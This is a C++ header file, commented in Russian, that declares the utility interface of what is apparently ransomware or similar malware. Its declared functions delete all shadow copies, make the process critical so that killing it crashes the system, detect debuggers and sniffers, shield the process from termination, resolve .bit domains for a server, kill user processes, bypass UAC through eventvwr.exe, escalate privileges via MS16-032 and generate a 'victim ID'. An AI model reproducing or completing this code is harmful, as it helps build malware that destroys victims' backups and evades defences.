#pragma once
#include <Windows.h>
#include <ShObjIdl.h>
#include <ShlGuid.h>
#include <vss.h>
#include <vswriter.h>
#include <vsbackup.h>
#include <WinDNS.h>
#include <Sddl.h>
#include <LM.h>
#include "Mem.h"
#include "Api.h"

#define MAX_NETWORKS 150 // Максимальное кол-во сетей на ПК
#define SHOW_DBG 1 // отображать ошибки важных функций


namespace Dbg
{
	 // Отображает информацию в консоль. Параметры как у printf.
	 void print(char *str, ...);
	 // Записывает информацию в файл.
	 void writeToFile(char *fileName, void* data, DWORD length);
	 // Код ошибки превращает в её описание.
	 LPSTR formatMsg(int errCode);

	 int _getchar();
}


namespace Utils
{
	//// https://www.nirsoft.net/kernel_struct/vista/PEB.html
	//// http://hex.pp.ua/nt/LDR_MODULE.php


	// Получает адрес kernel32 через peb.
	HMODULE getKernel32();
	// Получает адрес ntdll через peb.
	HMODULE getNtdll();
	// Аналог GetModuleHandle(0) через peb.
	HMODULE getModuleHandle0();
	/*
	 Получает адрес функции из таблицы экспорта. Проверок не делал, т.к. предпологается, что все длл заранее будут валидными.
	 hModule = длл, из которой берётся функция
	 function = имя функции
	*/
	BYTE* getProcAddress(HMODULE hModule, char* function);
	// Получает все диски в системе. Возвращает массив.
	char* GetDisks();
	/*
	 Создаёт ярлык (.lnk). Возвращает true, если удалось.
	 link = Путь к ярлыку
	 link_path = Путь к файлу, на который ярлык ссылается
	 description = Описание ярлыка
	*/
	bool CreateLink(LPSTR link, LPSTR link_path, LPSTR description);
	/*
	 Изменяет путь, на который указывает ярлык.
	 LinkPath = путь к ярлыку
	 NewLink = файл, на который будет указывать ярлык
	*/
	void ChangeLinkPath(LPSTR LinkPath, LPSTR NewLink);
	/*
	 Удаляет все теневые копии в системе. Требует админ прав. Возвращает true, если выполнилось успешно. Использует разные способы
	 в зависимости от разрядности.
	*/
	bool DeleteVss();
	// Делает процесс критическим. Требует админ прав. Почитай подробнее внутри :)
	void SetCritical();
	// Снимает флаг критического процесса. Требует админ прав. Нужно для адекватного завершения по, иначе будет бсод.
	void RemoveCritical();
	// Проверяет, отлаживается ли процесс путём проверки SE_DEBUG_PRIVILEGE. Возвращает true, если да.
	BOOL IsDebugger();
	// Проверяет, открыт ли какой-нибудь сниффер в данный момент. Чекает процессы на самые известные снифферы. Подробнее внутри.
	bool IsSniffer();
	/*
		Ставит на процесс дескриптор sddl_protection, все процессы с привилегиями не выше нашего процесса не могут его остановить,
		им будет выдано: Отказано в доступе. Не требует админ прав, но чем выше права - тем лучше. Работает только с Windows Vista.
		Возвращает true, если удалось.
	*/
	bool ProtectProcess();
	// Получает ip для доступа к .bit домену. Возвращает строку ip. Принимает .bit домен как аргумент.
	LPSTR GetBitDomen(LPSTR domen);
	// Аналог GetLastError(). Получает значение из TEB: https://www.nirsoft.net/kernel_struct/vista/TEB.html .
	ULONG getLastError();
	/*
	 Выключает все процессы, путь которых не ведёт в C:\Windows. Исключения = "chrome.exe, "iexplore.exe", "firefox.exe",
	 также не выключает себя - проверяет на совпадение с именем, указанным при билде, т.к. с ним будет лежать в appdata.
	*/
	void CloseProcesses(char* self);
	// Обход uac через eventvwr.exe. Перезапускает текущий процесс с правами админа, если всё вышло. Подробнее внутри.
	void UacBypass();
	// MS16-032
	void LPE();
	// Проверяет, запущен ли текущий процесс под админом.
	BOOL IsAdmin();
	// Получает ID жертвы. За основу генерации взято GUID. Подробнее внутри. Меняется при переустановке винды, нам подходит.
	LPSTR GetVictimId();
	// Получает текущее время в sql-формате. Предварительно форматирует его в МСК, подробнее внутри.
	LPSTR GetCurTime();
	/*
		Конвертирует данные для отправки на сервер. На данный момент корректирует только плюсы.
		Просмотрел данный документ: https://www.ietf.org/rfc/rfc1738.txt
		Сделал функцию универсальной, для добавления символов нужно будет только прописать case 'символ' перед case '+'.
		В юрл конвертируются символы, для которых isalnum возвращает 0 (не цифры, не буквы (любого регистра)).
	*/
	char *conv_url(char* str);
	// Проверяет, является ли ОС 64-битной. Возвращает true, если да.
	bool IsX64();
	// Читает необходимую информацию из секции trump :)
	void* ReadInfo();
}

namespace Crypt
{
	char* base64_encode(const unsigned char *input, int length);
	char* base64_decode(const char *input, int length, int *outlen);
}